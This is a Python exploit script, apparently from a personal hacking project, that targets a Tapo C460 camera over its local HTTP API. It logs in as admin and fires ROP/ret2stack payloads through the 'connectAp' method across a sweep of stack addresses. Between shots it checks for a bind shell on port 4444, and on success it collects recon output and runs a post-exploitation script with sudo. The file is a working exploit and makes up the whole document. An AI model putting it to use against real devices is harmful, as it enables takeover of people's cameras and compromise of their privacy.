#!/opt/homebrew/bin/python3
"""C460 burst sweeper v2: ONE login, then fire N ret2stack addresses back-to-back
inside a single wake window. Between shots: fast direct-connect shell probe; on
shell: in-band recon grab + postshell handoff. All HTTP bound to en1.
Usage: rop_burst.py <start_idx> <count> [--step 0x400]
"""
import sys, time, json, struct, base64, socket, subprocess, os

sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")
os.chdir("/Users/jemanuel/projects/franken_surveillance_system")
import tapo_connectap_sc as T

HOST = "192.168.4.33"
MAC = "50:3D:D1:E3:E2:07"
BASE = 0xbef80000
STEP = 0x400
LOG = "/tmp/c460_incremental_sweep.log"

def log(msg):
    with open(LOG, "a") as f:
        f.write(time.strftime("%H:%M:%S ") + msg + "\n")

def login():
    for i in range(600):
        r = T.post(HOST, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3)
        try:
            j = json.loads(r)
            if "stok" in j:
                return j["stok"], i
        except Exception:
            pass
        if i % 8 == 7:
            time.sleep(0.5)
    return None, -1

def grab_shell(addr):
    log(f"SHELL at {addr:#x} — grabbing recon in-band")
    try:
        s = socket.create_connection((HOST, 4444), timeout=5)
        s.settimeout(4)
        out = b""
        for c in (b"id\n", b"cat /proc/mtd\n", b"cat /proc/version\n"):
            s.sendall(c); time.sleep(1.5)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
                    out += d
            except socket.timeout:
                pass
        s.close()
        os.makedirs(f"/tmp/pane1/{HOST}", exist_ok=True)
        with open(f"/tmp/pane1/{HOST}/recon_sweep.txt", "wb") as f:
            f.write(out)
        log(f"recon {len(out)} bytes saved")
    except Exception as e:
        log(f"grab failed: {e}")
    subprocess.run(["sudo","-n","bash","deliverables/scripts/c460_postshell.sh",HOST],
                   capture_output=True, timeout=120)
    log("postshell chain dispatched")

def main():
    start_idx = int(sys.argv[1])
    count = int(sys.argv[2])
    step = int(sys.argv[3], 0) if len(sys.argv) > 3 else STEP

    # ONE login for the whole burst
    stok, tries = login()
    if not stok:
        log("burst: login never landed (window closed before DS)")
        print(json.dumps({"result": "no-login"}))
        return
    log(f"burst: login ok after {tries} tries — firing {count} addresses")

    sess = {"stok": stok}
    for i in range(count):
        idx = start_idx + i
        addr = BASE + idx * step
        marker = None
        b64 = T.build(OFF := 1060, marker, addr, sled=0, padpc=1, prefix=b"", bare=False, hang=True)
        body = {"method": "connectAp", "params": T.connect_params(b64, "Aardvark", "00:00:00:00:00:00")}
        t0 = time.time()
        try:
            r = T.req(HOST, sess, body, timeout=8)
            el = time.time() - t0
            ok = "raw" not in r
            log(f"{addr:#x} {el:.1f}s {'ok' if ok else 'DROP'}")
        except Exception as e:
            log(f"{addr:#x} EXC {e}")
        # probe shell between shots (cheap, 1s)
        try:
            s = socket.create_connection((HOST, 4444), timeout=1.5)
            s.close()
            log(f"SHELL OPEN at {addr:#x}")
            grab_shell(addr)
            with open("/tmp/c460_sweep_incremental.idx", "w") as f:
                f.write(str(idx))
            print(json.dumps({"result": "shell", "addr": hex(addr), "idx": idx}))
            return
        except Exception:
            pass
        with open("/tmp/c460_sweep_incremental.idx", "w") as f:
            f.write(str(idx))
    print(json.dumps({"result": "burst-done", "end_idx": start_idx + count}))

if __name__ == "__main__":
    main()
